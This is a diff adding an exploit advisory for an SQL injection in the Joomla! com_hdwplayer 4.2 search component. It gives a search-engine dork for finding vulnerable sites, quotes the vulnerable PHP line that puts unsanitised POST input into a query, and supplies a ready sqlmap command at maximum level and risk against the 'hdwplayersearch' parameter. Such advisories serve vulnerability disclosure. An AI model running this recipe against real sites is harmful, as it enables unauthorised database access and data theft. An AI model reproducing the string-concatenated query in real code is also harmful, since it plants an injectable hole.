@@ -1,0 +1,36 @@
+# Exploit Title: Joomla! com_hdwplayer 4.2 - 'search.php' SQL Injection
+# Dork: inurl:"index.php?option=com_hdwplayer"
+# Date: 2020-03-23
+# Exploit Author: qw3rTyTy
+# Vendor Homepage: https://www.hdwplayer.com/
+# Software Link: https://www.hdwplayer.com/download/
+# Version: 4.2
+# Tested on: Debian/Nginx/Joomla! 3.9.11
+
+##########################################################################
+#Vulnerability details
+##########################################################################
+File: components/com_hdwplayer/models/search.php
+Func: HdwplayerModelSearch::getsearch
+Line: 33
+
+    16	class HdwplayerModelSearch extends HdwplayerModel {
+    ...snip...
+    30		function getsearch() {
+    31	        $db = JFactory::getDBO();	
+    32			$search = JRequest::getVar('hdwplayersearch', '', 'post', 'string');		
+    33		$query = "SELECT * FROM #__hdwplayer_videos WHERE published=1 AND (title LIKE '%$search%' OR category LIKE '%$search%' OR tags LIKE '%$search%')";		//!!!
+    34	
+    35	        $db->setQuery($query);
+    36	        $output = $db->loadObjectList();		
+    37	        return($output);
+    38	    }
+    39		
+    40	}
+    41	
+    42	?>
+
+##########################################################################
+#PoC
+##########################################################################
+$> python ./sqlmap.py -u "http://127.0.0.1/joomla/index.php" --method=POST --random-agent --data "option=com_hdwplayer&view=search&hdwplayersearch=xxx" --level=5 --risk=3 --dbms=mysql -p hdwplayersearch
